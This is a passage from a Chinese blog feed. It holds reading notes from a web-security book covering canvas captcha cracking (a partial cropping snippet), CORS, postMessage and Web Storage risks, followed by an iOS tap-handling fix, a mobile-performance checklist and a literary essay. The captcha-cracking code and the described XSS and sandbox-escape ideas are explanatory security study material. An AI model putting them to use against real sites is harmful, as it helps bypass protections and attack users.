cropped_canvas.getContext(<span class="string">"2d"</span>).fillRect(<span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">25</span>);</div><div class="line">  <span class="keyword">var</span> edges = find_edges(image_data[i]);</div><div class="line">  cropped_canvas.getContext(<span class="string">"2d"</span>).drawImage(canvas, edges[<span class="number">0</span>], edges[<span class="number">1</span>],</div><div class="line">    edges[<span class="number">2</span>]-edges[<span class="number">0</span>], edges[<span class="number">3</span>]-edges[<span class="number">1</span>], <span class="number">0</span>, <span class="number">0</span>,</div><div class="line">    edges[<span class="number">2</span>]-edges[<span class="number">0</span>], edges[<span class="number">3</span>]-edges[<span class="number">1</span>]);</div><div class="line">    image_data[i] = cropped_canvas.getContext(<span class="string">"2d"</span>).getImageData(<span class="number">0</span>, <span class="number">0</span>,</div><div class="line">      cropped_canvas.width, cropped_canvas.height);</div></pre></td></tr></table></figure>
<p>完整的实现可以参考前文注释中提到的UserScripts代码。<br>在此基础上，作者甚至能够破解一些更为复杂的验证码，比如：</p>
<p>破解验证码</p>
<p>通过Canvas自动破解验证码，最大的好处是可以在浏览器环境中实现在线破解，大大降低了攻击的门槛。HTML 5使得过去难以做到的事情，变为可能。</p>
<p><hr /></p>
<h3 id="6-2-1-Cross-Origin-Resource-Sharing"><a href="#6-2-1-Cross-Origin-Resource-Sharing" class="headerlink" title="6.2.1 Cross-Origin Resource Sharing"></a>6.2.1 Cross-Origin Resource Sharing</h3><p>浏览器实现的同源策略（<code>Same Origin Policy</code>）限制了脚本的跨域请求。但互联网的发展趋势是越来越开放的，因此跨域访问的需求也变得越来越迫切。同源策略给Web开发者带来了很多困扰，他们不得不想方设法地实现一些“合法”的跨域技术，由此诞生了<code>jsonp</code>、<code>iframe</code>跨域等技巧。</p>
<p>W3C委员会决定制定一个新的标准来解决日益迫切的跨域访问问题。这个新的标准叙述如下。<br>假设从<code>http://www.a.com/test.html</code>发起一个跨域的XMLHttpRequest请求，请求的地址为：<code>http://www.b.com/test.php</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">   var client = new XMLHttpRequest();</div><div class="line">   client.open(&quot;GET&quot;, &quot;http://www.b.com/test.php&quot;);</div><div class="line">   client.onreadystatechange = function() &#123; &#125;</div><div class="line">   client.send(null);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>如果是在IE 8中，则需要使用XDomainRequest来实现跨域请求。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var request = new XDomainRequest();</div><div class="line">request.open(&quot;GET&quot;, xdomainurl);</div><div class="line">request.send();如果服务器www.b.com返回一个HTTP Header： www.b.com</div><div class="line">Access-Control-Allow-Origin: http://www.a.com</div></pre></td></tr></table></figure>
<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;?php</div><div class="line">header(&quot;Access-Control-Allow-Origin: *&quot;);</div><div class="line">  ?&gt;</div><div class="line">Cross Domain Request Test!</div></pre></td></tr></table></figure>
<p>那么这个来自<code>http://www.a.com/test.html</code>的跨域请求就会被通过。<br>在这个过程中，<code>http://www.a.com/test.html</code>发起的请求还必须带上一个 <code>Origin Header：Origin: http://www.a.com</code></p>
<p>在Firefox上，可以抓包分析这个过程。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">GET http://www.b.com/test.php HTTP/1.1</div><div class="line">Host: www.b.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1b2) Gecko/20081201</div><div class="line">Firefox/3.1b2 Paros/3.2.13</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-cn,zh;q=0.5</div><div class="line">Accept-Charset: gb2312,utf-8;q=0.7,*;q=0.7</div><div class="line">Keep-Alive: 300</div><div class="line">Proxy-Connection: keep-alive</div><div class="line">Referer: http://www.a.com/test.html</div><div class="line">Origin: http://www.a.com</div><div class="line">Cache-Control: max-age=0</div><div class="line"></div><div class="line"></div><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Thu, 15 Jan 2009 06:28:54 GMT</div><div class="line">Server: Apache/2.0.63 (Win32) PHP/5.2.6</div><div class="line">X-Powered-By: PHP/5.2.6</div><div class="line">Access-Control-Allow-Origin: *</div><div class="line">Content-Length: 28</div><div class="line">Content-Type: text/html</div><div class="line"></div><div class="line">Cross Domain Request Test!</div></pre></td></tr></table></figure>
<p>Origin Header用于标记HTTP发起的“源”，服务器端通过识别浏览器自动带上的这个Origin Header，来判断浏览器的请求是否来自一个合法的“源”。Origin Header可以用于防范CSRF，它不像Referer那么容易被伪造或清空。</p>
<p>在上面的例子中，服务器端返回：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Access-Control-Allow-Origin: *</div></pre></td></tr></table></figure>
<p>从而允许客户端的跨域请求通过。在这里使用了通配符<code>*</code>，这是极其危险的，它将允许来自任意域的跨域请求访问成功。这就好像Flash策略中的<code>allow-access-from: *</code>一样，等于没有做任何安全限制。<br>对于这个跨域访问的标准，还有许多HTTP Header可以用于进行更精确的控制：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">4 Syntax</div><div class="line">4.1 Access-Control-Allow-Origin HTTP Response Header</div><div class="line">4.2 Access-Control-Max-Age HTTP Response Header</div><div class="line">4.3 Access-Control-Allow-Credentials HTTP Response Header</div><div class="line">4.4 Access-Control-Allow-Methods HTTP Response Header</div><div class="line">4.5 Access-Control-Allow-Headers HTTP Response Header</div><div class="line">4.6 Origin HTTP Request Header</div><div class="line">4.7 Access-Control-Request-Method HTTP Request Header</div><div class="line">4.8 Access-Control-Request-Hea</div></pre></td></tr></table></figure>
<p><hr /></p>
<h3 id="6-2-2-postMessage——跨窗口传递消息"><a href="#6-2-2-postMessage——跨窗口传递消息" class="headerlink" title="6.2.2 postMessage——跨窗口传递消息"></a>6.2.2 postMessage——跨窗口传递消息</h3><p><hr /><br>postMessage——跨窗口传递消息</p>
<p>在“跨站脚本攻击”一章中，曾经提到利用window.name来跨窗口、跨域传递信息。实际上，window这个对象几乎是不受同源策略限制的，很多脚本攻击都巧妙地利用了window对象的这一特点。<br>在HTML 5中，为了丰富Web开发者的能力，制定了一个新的API：postMessage。在Firefox 3、IE 8、Opera 9等浏览器中，都已经开始支持这个API。</p>
<p>postMessage允许每一个window（包括当前窗口、弹出窗口、iframes等）对象往其他的窗口发送文本消息，从而实现跨窗口的消息传递。这个功能是不受同源策略限制的。</p>
<p>发送窗口：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://dev.jquery.com/~john/message/"</span> <span class="attr">id</span>=<span class="string">"iframe"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"msg"</span> <span class="attr">value</span>=<span class="string">"Message to send"</span>/&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></div><div class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">var</span> win = <span class="built_in">document</span>.getElementById(<span class="string">"iframe"</span>).contentWindow;</div><div class="line">  <span class="built_in">document</span>.getElementById(<span class="string">"form"</span>).onsubmit = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</div><div class="line">    win.postMessage( <span class="built_in">document</span>.getElementById(<span class="string">"msg"</span>).value );</div><div class="line">    e.preventDefault();</div><div class="line">  &#125;;</div><div class="line">&#125;;</div><div class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!--接收窗口：--&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>This iframe is located on dev.jquery.com<span class="tag">&lt;/<span class="name">b</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span>Send me a message!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></div><div class="line"><span class="built_in">document</span>.addEventListener(<span class="string">"message"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</div><div class="line">  <span class="built_in">document</span>.getElementById(<span class="string">"test"</span>).textContent =</div><div class="line">  e.domain + <span class="string">" said: "</span> + e.data;</div><div class="line">&#125;, <span class="literal">false</span>);</div><div class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>在这个例子中，发送窗口负责发送消息；而在接收窗口中，需要绑定一个message事件，监听其他窗口发来的消息。这是两个窗口之间的一个“约定”，如果没有监听这个事件，则无法接收到消息。<br>在使用postMessage()时，有两个安全问题需要注意。</p>
<p>（1）在必要时，可以在接收窗口验证 Domain，甚至验证URL，以防止来自非法页面的消息。这实际上是在代码中实现一次同源策略的验证过程。<br>（2）在本例中，接收的消息写入textContent，但在实际应用中，如果将消息写入innerHTML，甚至直接写入script中，则可能会导致DOM based XSS的产生。根据“Secure By Default”原则，在接收窗口不应该信任接收到的消息，而需要对消息进行安全检查。</p>
<p>使用postMessage，也会使XSS Payload变得更加的灵活。Gareth Heyes曾经实现过一个JavaScript运行环境的sandbox，其原理是创建一个iframe，将JavaScript限制于其中执行。但笔者经过研究发现，利用postMessage() 给父窗口发送消息，可以突破此sandbox。类似的问题可能还会存在于其他应用中。</p>
<p><hr /></p>
<h3 id="6-2-3-Web-Storage"><a href="#6-2-3-Web-Storage" class="headerlink" title="6.2.3 Web Storage"></a>6.2.3 Web Storage</h3><p>在Web Storage出现之前，Gmail的离线浏览功能是通过Google Gears实现的。但随着Google Gears的夭折，Gmail转投Web Storage的怀抱。目前Google众多的产品线比如Gmail、Google Docs等所使用的离线浏览功能，都使用了Web Storage。</p>
<p>过去在浏览器里能够存储信息的方法有以下几种：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Cookie</div><div class="line">Flash Shared Object</div><div class="line">IE UserData</div></pre></td></tr></table></figure>
<p>其中，Cookie主要用于保存登录凭证和少量信息，其最大长度的限制决定了不可能在Cookie中存储太多信息。而Flash Shared Object和IE UserData则是Adobe与微软自己的功能，并未成为一个通用化的标准。因此W3C委员会希望能在客户端有一个较为强大和方便的本地存储功能，这就是Web Storage。</p>
<p><code>Web Storage</code>分为<code>Session Storage</code> 和 Local Storage。Session Storage关闭浏览器就会失效，而Local Storage则会一直存在。Web Storage就像一个非关系型数据库，由Key-Value对组成，可以通过JavaScript对其进行操作。目前Firefox 3和IE 8都实现了Web Storage。使用方法如下：<br>设置一个值：<code>window.sessionStorage.setItem(key, value)</code>;<br>读取一个值：<code>window.sessionStorage.getItem(key)</code>;<br>此外，Firefox还单独实现了一个globalStorage，它是基于SQLite实现的。</p>
<p><code>window.globalStorage.namedItem(domain).setItem(key, value);</code></p>
<p>下面这个例子展示了Web Storage的使用。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"sessionStorage_show"</span>&gt;</span></div><div class="line">  sessionStorage Value:</div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"localStorage_show"</span>&gt;</span></div><div class="line">  localStorage Value:</div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"set"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"check"</span> <span class="attr">onclick</span>=<span class="string">"set();"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="built_in">window</span>.sessionStorage.setItem(<span class="string">"test"</span>, <span class="string">"this is sessionStorage"</span>);</div><div class="line">  <span class="keyword">if</span> (<span class="built_in">window</span>.globalStorage)&#123;</div><div class="line">    <span class="built_in">window</span>.globalStorage.namedItem(<span class="string">"a.com"</span>).setItem(<span class="string">"test"</span>, <span class="string">"this is LocalStorage"</span>);</div><div class="line">  &#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="built_in">window</span>.localStorage.setItem(<span class="string">"test"</span>, <span class="string">"this is LocalStorage"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">document</span>.getElementById(<span class="string">"sessionStorage_show"</span>).innerHTML +=</div><div class="line">  <span class="built_in">window</span>.sessionStorage.getItem(<span class="string">"test"</span>);</div><div class="line">  <span class="keyword">if</span> (<span class="built_in">window</span>.globalStorage)&#123;</div><div class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"localStorage_show"</span>).innerHTML +=</div><div class="line">    <span class="built_in">window</span>.globalStorage.namedItem(<span class="string">"a.com"</span>).getItem(<span class="string">"test"</span>);</div><div class="line">  &#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"localStorage_show"</span>).innerHTML +=</div><div class="line">    <span class="built_in">window</span>.localStorage.getItem(<span class="string">"test"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">set();</div><div class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>Web Storage也受到同源策略的约束，每个域所拥有的信息只会保存在自己的域下</p>
<p>Web Storage让Web开发更加的灵活多变，它的强大功能也为XSS Payload大开方便之门。攻击者有可能将恶意代码保存在Web Storage中，从而实现跨页面攻击。<br>当Web Storage中保存有敏感信息时，也可能会成为攻击的目标，而XSS攻击可以完成这一过程。<br>可以预见，Web Storage会被越来越多的开发者所接受，与此同时，也将带来越来越多的安全挑战。</p>
<hr />
</script></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;白帽子讲Web安全&quot;&gt;&lt;a href=&quot;#白帽子讲Web安全&quot; class=&quot;headerlink&quot; title=&quot;白帽子讲Web安全&quot;&gt;&lt;/a&gt;白帽子讲Web安全&lt;/h3&gt;&lt;p&gt;吴翰清&lt;/p&gt;
&lt;hr&gt;

&lt;h3 id=&quot;1-5-安全三要素&quot;&gt;&lt;a href=&quot;
    
    </summary>
    
      <category term="Web 安全" scheme="http://www.wanglinzhizhi.me/categories/Web-%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="移动Web" scheme="http://www.wanglinzhizhi.me/tags/%E7%A7%BB%E5%8A%A8Web/"/>
    
      <category term="程序员的浪漫" scheme="http://www.wanglinzhizhi.me/tags/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%B5%AA%E6%BC%AB/"/>
    
      <category term="web安全" scheme="http://www.wanglinzhizhi.me/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="黑客" scheme="http://www.wanglinzhizhi.me/tags/%E9%BB%91%E5%AE%A2/"/>
    
      <category term="漏洞" scheme="http://www.wanglinzhizhi.me/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="注入" scheme="http://www.wanglinzhizhi.me/tags/%E6%B3%A8%E5%85%A5/"/>
    
      <category term="XXS" scheme="http://www.wanglinzhizhi.me/tags/XXS/"/>
    
      <category term="CSRF" scheme="http://www.wanglinzhizhi.me/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>取消双击上滑</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/%E7%A6%81%E6%AD%A2IOS%E5%8F%8C%E5%87%BB%E4%B8%8A%E6%BB%91/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/禁止IOS双击上滑/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-02-18T07:27:48.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="取消双击上滑"><a href="#取消双击上滑" class="headerlink" title="取消双击上滑"></a>取消双击上滑</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> agent = navigator.userAgent.toLowerCase();</div><div class="line"><span class="keyword">var</span> iLastTouch = <span class="literal">null</span>;</div><div class="line"><span class="keyword">if</span> (agent.indexOf(<span class="string">"iphone"</span>) &gt;= <span class="number">0</span> || agent.indexOf(<span class="string">"ipad"</span>) &gt;= <span class="number">0</span>) &#123;</div><div class="line">    <span class="built_in">document</span>.body.addEventListener(<span class="string">"touchend"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime();</div><div class="line">        iLastTouch = iLastTouch || a + <span class="number">1</span>;</div><div class="line">        <span class="keyword">var</span> c = a - iLastTouch;</div><div class="line">        <span class="keyword">if</span> (c &lt; <span class="number">500</span> &amp;&amp; c &gt; <span class="number">0</span>) &#123;</div><div class="line">            event.preventDefault();</div><div class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">        &#125;</div><div class="line">        iLastTouch = a</div><div class="line">    &#125;, <span class="literal">false</span>);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;取消双击上滑&quot;&gt;&lt;a href=&quot;#取消双击上滑&quot; class=&quot;headerlink&quot; title=&quot;取消双击上滑&quot;&gt;&lt;/a&gt;取消双击上滑&lt;/h2&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class
    
    </summary>
    
      <category term="移动Web" scheme="http://www.wanglinzhizhi.me/categories/%E7%A7%BB%E5%8A%A8Web/"/>
    
    
      <category term="HTML5" scheme="http://www.wanglinzhizhi.me/tags/HTML5/"/>
    
      <category term="iOS" scheme="http://www.wanglinzhizhi.me/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>移动性能</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/%E7%A7%BB%E5%8A%A8web%20%E6%80%A7%E8%83%BD/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/移动web 性能/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="移动性能"><a href="#移动性能" class="headerlink" title="移动性能"></a>移动性能</h2><h3 id="要考虑Android低端机与2G网络场景下性能-注意！"><a href="#要考虑Android低端机与2G网络场景下性能-注意！" class="headerlink" title="要考虑Android低端机与2G网络场景下性能 注意！"></a>要考虑<code>Android</code>低端机与<code>2G</code>网络场景下性能 注意！</h3><p>发布前必要检查项</p>
<ul>
<li>所有图片必须有进行过压缩</li>
<li>考虑适度的有损压缩，如转化为80%质量的jpg图片</li>
<li>考虑把大图切成多张小图，常见在banner图过大的场景</li>
</ul>
<p>加载性能优化, 达到打开足够快</p>
<ul>
<li>数据离线化，考虑将数据缓存在 localStorage</li>
<li>初始请求资源数 <code>&lt; 4</code> 注意！</li>
<li>图片使用CSS Sprites 或 DataURI</li>
<li>外链 CSS 中避免 @import 引入</li>
<li>考虑内嵌小型的静态资源内容</li>
<li>初始请求资源gzip后总体积 <code>&lt; 50kb</code></li>
<li>静态资源(HTML/CSS/JS/Image)是否优化压缩？</li>
<li>避免打包大型类库</li>
<li>确保接入层已开启Gzip压缩（考虑提升Gzip级别，使用CPU开销换取加载时间） 注意！</li>
<li>尽量使用CSS3代替图片</li>
<li>初始首屏之外的静态资源（JS/CSS）延迟加载 注意！</li>
<li>初始首屏之外的图片资源按需加载（判断可视区域） 注意！</li>
<li>单页面应用(SPA)考虑延迟加载非首屏业务模块</li>
<li>开启Keep-Alive链路复用</li>
</ul>
<p>运行性能优化, 达到操作足够流畅</p>
<ul>
<li>避免 iOS 300+ms 点击延时问题 注意！</li>
<li>缓存 DOM 选择与计算</li>
<li>避免触发页面重绘的操作</li>
<li>Debounce连续触发的事件(scroll / resize / touchmove等)，避免高频繁触发执行 注意！</li>
<li>尽可能使用事件代理，避免批量绑定事件</li>
<li>使用CSS3动画代替JS动画</li>
<li>避免在低端机上使用大量CSS3渐变阴影效果，可考虑降级效果来提升流畅度</li>
<li>HTML结构层级保持足够简单</li>
<li>尽能少的使用CSS高级选择器与通配选择器</li>
<li>Keep it simple</li>
</ul>
<p>在线性能检测评定工具使用指南</p>
<ul>
<li>访问 <a href="http://developers.google.com/speed/pagespeed/insights/" target="_blank" rel="external">Google PageSpeed</a> 在线评定网站</li>
<li>在地址栏输入目标URL地址，点击分析按钮开始检测</li>
<li>按 PageSpeed 分析出的建议进行优化，优先解决红色类别的问题</li>
</ul>
<p>推荐阅读</p>
<ul>
<li><a href="http://www.webperformancetoday.com/tag/mobile-web-performance/" target="_blank" rel="external">移动WEB性能</a></li>
<li><a href="https://developers.google.com/speed/docs/best-practices/caching" target="_blank" rel="external">优化WEB缓存</a></li>
<li><a href="https://developers.google.com/speed/docs/best-practices/rtt" target="_blank" rel="external">最小化RTT次数</a></li>
<li><a href="https://developers.google.com/speed/docs/best-practices/payload" target="_blank" rel="external">最小化请求负载</a></li>
<li><a href="https://developers.google.com/speed/docs/best-practices/rendering" target="_blank" rel="external">优化浏览器渲染</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;移动性能&quot;&gt;&lt;a href=&quot;#移动性能&quot; class=&quot;headerlink&quot; title=&quot;移动性能&quot;&gt;&lt;/a&gt;移动性能&lt;/h2&gt;&lt;h3 id=&quot;要考虑Android低端机与2G网络场景下性能-注意！&quot;&gt;&lt;a href=&quot;#要考虑Android低端机与2G网络
    
    </summary>
    
      <category term="前端架构" scheme="http://www.wanglinzhizhi.me/categories/%E5%89%8D%E7%AB%AF%E6%9E%B6%E6%9E%84/"/>
    
    
      <category term="移动性能" scheme="http://www.wanglinzhizhi.me/tags/%E7%A7%BB%E5%8A%A8%E6%80%A7%E8%83%BD/"/>
    
      <category term="性能分析" scheme="http://www.wanglinzhizhi.me/tags/%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>朱炫 白马将军</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/%E7%99%BD%E9%A9%AC%E5%B0%86%E5%86%9B/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/白马将军/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-02-18T07:27:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="白马将军"><a href="#白马将军" class="headerlink" title="白马将军"></a>白马将军</h2><p><strong>朱炫</strong>   </p>
<p>年少荒唐</p>
<blockquote>
<p>我不做王侯，也不做公主，我只做这世间放荡的野火。</p>
</blockquote>
<p>时代是奔流大潮，铁砂巨炮，也是烈日焚河，冰峰陡角。公元前209年，罗马人攻占了新迦太基城，几万个罗马青年手持短柄剑，组成了绛红的军团阵，旌旗猎猎舒卷，山谷里传来吼声。这一年也是秦二世元年，大泽乡的两个农民砸碎了兵卒头骨，领着百个必死无疑的苦工，责问苍天。他们问，天下的王侯贵胄，又岂是生来的龙种。大雨瓢泼，满地的泥泞与血浆，于是苍天无语，但是他们都得到了想要的答案。</p>
<p>庶子也有庶子的不服气。我一直喜欢写庶子的故事。那些出身贫寒的人，一无所有或者几乎一无所有的人，他们在荒原上策马，扛着一杆旗，寻找着同样一无所有的同伴。这些人汇在一处，举着火把，就是草原上奔涌的火龙。天是铁铅肃穆，地是苍翠野草，牛皮红铜的软甲结了一层轻薄的霜，高天上落下冰润的细雨，啪嗒啪嗒地响在形态各异的头盔上，这些年轻人就用刀背拍打马鞍，朝着天空大吼，这是他们的不服气。年轻人们要横扫，说到，就一定会做到。</p>
<p>能这么写，大抵是因为，我还年轻，我还会偶尔的热血冲动，想着领头的白马将军射出一道燃火羽箭，照亮了千层塔楼，里面住着八重锦的公主，但白马将军且不是为了公主来的，他要带走公主身旁的丫鬟，这个普通得不能再普通的女孩，不单要带走她，还要连她的兽头玛瑙小玉佩一同带走，那是他们定情的信物。一个庶民，为了另一个庶民，推翻了一整个王朝。</p>
<p>我喜欢这样的故事，年轻人爱上一个女孩儿，根本不需要公主，只有冲锋与重逢。我能想象这个小丫鬟，她指着天地尽头的一团红铠压阵的骑军告诉公主，那里领头的，是我的男人，他要来接我。我不做丫鬟，也不做你这样的公主，我只做英雄志里的红颜烈火。我又听见细密的鼓点了，节奏的，深埋在黑暗的壁垒中。那是雷云的迸裂，也是枯火的升腾。无数的冰雨拍打着落魄的铠甲，一万个年轻人高举铁枪，围住了辉煌的王都，他们来自五湖四海，要推翻什么东西。</p>
<p>你问他为什么，因为他不服气。也许在年幼的时候女孩就被卖入宫中，也许那些大臣们毫不掩饰的企图猥亵。她原本没有太多选择的自由，但我要她在红绢下藏了一柄鱼肠匕首，谁也不能近前，谁来，谁就是朱红血点子斑斑。我还要给她一个结局，我让那些同样不服气的年轻人向着一杆旗奔涌，在混乱的战场上，马匹嘶鸣，剑雨弓矢，无数的人向着那杆红旗冲过去。他们的主帅是白马将军，很多年以前，他无能为力，很多年以后，他睥睨着近在咫尺的国都，他说，来吧，各位，与我同行。</p>
<p>这个人就是不服气。我喜欢写这些，什么白马将军，带一个女人走，满天的箭雨中，点燃一座高塔，什么飞身接住跃下的女人，大红袍子，成为一丈的传奇。</p>
<p>我想，之所以我老是不服气，是因为我是一个二愣子。我觉得，这世上机灵鬼那么多，多几个二愣子，没准是好事。我所在的地方，活着各式各样的三教九流，啃食着梦与酣畅，徘徊在谷底和巅峰，是白日里皱起的剑眉，也是夜晚欢实的小裤衩，是英雄纪念碑的铜头铁臂，也是三里屯的狡黠迷离。大城偌大，大到成了所有人的梦想地与行刑场。</p>
<p>面对这些，我觉得做个二愣子挺好，我也善于将我在人海里遇见的陌生人，想象成我这样的人。他们有人可能是白领，冬夜里加班，走出写字楼，身边驶过呼啸的跑车，寒风钻进衣领，他一缩脖子，瞧见车窗内女郎的丝袜长腿，黑色，末角破了个小洞，还有那粉红色的香槟、金色的大高跟、放荡的笑声、啵个没完的低吟。短短一瞬，他发觉车内与车外的人同龄，随后他抬起头，是路灯，是星夜寒凉，前路茫茫，可他只是笑笑，天底下没有比这更野的笑容。</p>
<p>还有人可能是学生，女朋友的电话不理，他的生活费越发拮据，他也抬起头，看见商界领袖，文学新秀们走进礼堂，风华正茂的，豪言壮语的，吃不起是味蕾封闭，玩不起是金钱无情，教你分分钟创业，小轻松下海，没事给自己代言，说多了都是人生巅峰。听着听着，他发现，台上与台下的同龄，他又笑笑，拳头攥得比谁都紧。更有人，我听闻还是考古队员，四十度的高温野外勘探，有人走过场，有人熬着，年轻人对着未能妥善保管的文物流泪，吃开水泡饭。他打开电视，电视里是光鲜的偶像，他们与年轻人同龄，可他风干的手捧着陶土，也只是笑笑，又要通宵。坐地铁的时候，我身边全是这样的人。北京有十几条地铁线，每天有大几十万人挤在车厢里，小几百人试图卧轨。这里像碧珠的玉盘，亮堂的金池，五光十色的。我能想到，这些人的生活是同步进行的，欢笑，殴打，逃避，拼搏，恨嫉，通奸，擦屁股，打摆子，说相声，开出租，抠脚趾，打老拳，行云流水，老汉推车，风姿绰约，籍籍无名，都是同步的。</p>
<p>这些人里，就有不怕死的二愣子，像野火，烧不尽的愣子，星夜寒凉，前路茫茫，付之一笑，没有比这更野更狂的家伙。他们还想着做点什么，还要声援点什么。当然，梦想可以劝阻，道理也都说得通，但这些二五八万的二愣子，穿过了热浪与刀斧，捉住了一匹马，竖起了一杆旗。狗日的倔脾气。</p>
<p>没错，生活是一场光怪陆离，碌碌无为，蝇营狗苟，拥挤在地铁里，是一群待宰羔羊。这里没有白衣胜雪，没有，车厢是铁铸囚牢，隧道是古兽咽喉，大部分时间，大多数人，都自以为，或妄想为时代的弄潮儿，最终，浪花一卷，什么也不剩。但就是有人，拼命地游，既然最终都是浪花一卷，也可以不死不休。</p>
<p>故事的最后，我要白马将军抬起头，吹完了铁笛子，不再困惑。他听闻前军已经摆好阵势，好一杆大旗竖起，红底黑字，八方的狂风，云渊之处，万马齐喑。“冲锋吧。”</p>
<p>一万个年轻人拍打着马刀，要冲向山与海的尽头。阁楼里，素装的丫鬟叩了叩兽头玛瑙的信物，像是敲响了结尾的小钟。我不做王侯，也不做公主，我只做这世间放荡的野火。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;白马将军&quot;&gt;&lt;a href=&quot;#白马将军&quot; class=&quot;headerlink&quot; title=&quot;白马将军&quot;&gt;&lt;/a&gt;白马将军&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;朱炫&lt;/strong&gt;   &lt;/p&gt;
&lt;p&gt;年少荒唐&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我不做王侯，也
    
    </summary>
    
      <category term="文学" scheme="http://www.wanglinzhizhi.me/categories/%E6%96%87%E5%AD%A6/"/>
    
    
      <category term="文学" scheme="http://www.wanglinzhizhi.me/tags/%E6%96%87%E5%AD%A6/"/>
    
